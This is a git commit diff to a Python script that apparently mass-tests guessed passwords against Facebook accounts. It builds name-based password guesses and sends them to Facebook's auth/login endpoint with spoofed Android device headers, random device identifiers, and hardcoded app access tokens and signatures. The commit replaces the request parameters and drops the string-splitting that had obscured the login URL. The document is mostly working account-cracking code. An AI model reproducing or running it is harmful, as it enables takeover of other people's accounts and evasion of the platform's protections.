e7343d6f16c2058ec249bd902c99a5b11c087d53
DESTROYED-TESTER <168154763+DESTROYED-TESTER@users.noreply.github.com>
2026-06-14 11:48:04 +0530

    Update bithi.py

--- bithi.py
+++ bithi.py
@@ -341,6 +341,8 @@ def __MTDONEE__(ids, names, passlist, total_ids):
         ps2 = last.lower()
         for fikr in passlist:
             pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
+            current_time = str(int(time.time()))
+            password = f"#PWD_FB4A:0:{current_time}:sumon@12M"
             netheni = str(random.randint(20000, 40000))
             simheni = str(random.randint(20000, 40000))
             cban = str(random.randint(20000000, 30000000))
@@ -351,32 +353,62 @@ def __MTDONEE__(ids, names, passlist, total_ids):
             family_device_id = str(uuid.uuid4()).upper()
             advertiser_id = str(uuid.uuid4()).upper()
             data = {
-                "adid": f"{adid}",
-                "device_id": f"{device_id}",
-                "family_device_id": f"{family_device_id}",
-                "secure_family_device_id": f"{advertiser_id}",
-                "access_token": "6628568379|c1e620fa708a1d5696fb991c1bde5662",
-                "sdk_version": str(random.randint(1,26)),
-                "email": ids,
-                "password": pas,
-                "sdk": "android",
-                "locale": random.choice(["en_US","en_GB","bn_IN","in_ID"]),
-                "generate_session_cookies": "1",
-                "sig": "c1e620fa708a1d5696fb991c1bde5662",}
+            'adid': '01a378a8-2b90-498a-bdf1-ae0359bcd2c4',
+            'format': 'json',
+            'device_id': 'a143397c-0621-4803-a8e5-fcce42e40197',
+            'email': '61578494318368',
+            'password': password,
+            'generate_analytics_claim': '1',
+            'community_id': '',
+            'cpl': 'true',
+            'try_num': '1',
+            'cds_experiment_group': '-1',
+            'family_device_id': 'd3e35bd2-fe96-4678-b809-af07741237cb',
+            'secure_family_device_id': '441d9943-87fc-4ab8-aa47-65c4b7ce2c9f',
+            'sim_serials': '["3a:fa:04:81:8a:f9"]',
+            'credentials_type': 'password',
+            'fb4a_shared_phone_cpl_experiment': 'fb4a_shared_phone_nonce_cpl_at_risk_v3',
+            'fb4a_shared_phone_cpl_group': 'enable_v3_at_risk',
+            'enroll_misauth': 'false',
+            'generate_session_cookies': '1',
+            'error_detail_type': 'button_with_disabled',
+            'source': 'login',
+            'generate_machine_id': '1',
+            'jazoest': '22271',
+            'meta_inf_fbmeta': 'NO_FILE',
+            'advertiser_id': '01a378a8-2b90-498a-bdf1-ae0359bcd2c4',
+            'encrypted_msisdn': 'Ae8zzUIz7jzFEdYZ_MfSxNpfJWWf7sEjY1NcPkmF77iy5htR_9up5PTD5F_uiQSsTCZcpD6rkVKsXX2cruVjuomJSgv_6CL0D4W8NgP4t0l2RP7KEaCvZMfTSfs480JL0VxLr2pOTnPU0pWtqQG1BE3UX5lYgtmL60shj5eL4tK1OzKSUzVjy_FPAw6SR7bw1Lw9-j9ZJDnDyTYN30pSSbLnMMZbU9wDeEWpqRmFWt2FieCt1NCk22eRtTagf0_SZr77UhSVsCyCZpOWv3ZokAaubmoZzdePyaj36KeapwcqWnt9hpkv9CuFc_PoCnKyx7cIPAnx-sGkYvCP8XYMjUIp',
+            'currently_logged_in_userid': '0',
+            'locale': 'en_US',
+            'client_country_code': 'BD',
+            'fb_api_req_friendly_name': 'authenticate',
+            'fb_api_caller_class': 'Fb4aAuthHandler',
+            'api_key': '882a8490361da98702bf97a021ddc14d',
+            'sig': '80272038ac17dd62a2e00dc4a78b45c7',
+            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',}
             headers = [
-                "Host: graph.facebook.com",
-                f"x-fb-connection-bandwidth: {cban}",
-                f"x-fb-sim-hni: {netheni}",
-                f"x-fb-net-hni: {simheni}",
-                "x-fb-connection-quality: EXCELLENT",
-                "content-type: application/x-www-form-urlencoded",
-                "x-fb-http-engine: Liger",
-                f"User-Agent: {user_agent.encode('utf-8')}",
-            ]
-            url = "https://a"+"pi.face"+"book.c"+"om/a"+"uth/login"
+            'Priority: u=3, i',
+            'Authorization: OAuth null',
+            'X-FB-Connection-Quality: GOOD',
+            'X-FB-SIM-HNI: 47007',
+            'X-FB-Net-HNI: 47002',
+            'User-Agent: Dalvik/2.1.0 (Linux; U; Android 14; TECNO CK7n Build/UP1A.231005.007) [FBAN/FB4A;FBAV/370.0.0.23.112;FBPN/com.facebook.katana;FBLC/en_US;FBBV/374931177;FBCR/Airtel;FBMF/TECNO;FBBD/TECNO;FBDV/TECNO CK7n;FBSV/14;FBCA/arm64-v8a:null;FBDM/{density=2.7375,width=1080,height=2292};FB_FW/1;FBRV/0;]',
+            'Host: b-graph.facebook.com',
+            'Content-Type: application/x-www-form-urlencoded',
+            'X-FB-Connection-Type: MOBILE.LTE',
+            'x-fb-device-group: 701',
+            'X-Tigon-Is-Retry: False',
+            'X-FB-Friendly-Name: authenticate',
+            'X-FB-Request-Analytics-Tags: unknown',
+            'X-FB-HTTP-Engine: Liger',
+            'X-FB-Client-IP: True',
+            'X-FB-Server-Cluster: True',
+            'Connection: keep-alive',
+            'Accept-Encoding: gzip, deflate',]
+            url = "https://b-graph.facebook.com/auth/login"
             buffer = BytesIO()
             c = pycurl.Curl()
-            c.setopt(c.URL, 'https://ap'+'i.faceb'+'ook.com/au'+'th/login')
+            c.setopt(c.URL, 'https://b-graph.facebook.com/auth/login')
             c.setopt(c.HTTPHEADER, headers)
             c.setopt(c.WRITEDATA, buffer)
             data_encoded = '&'.join([f"{key}={value}" for key, value in data.items()])
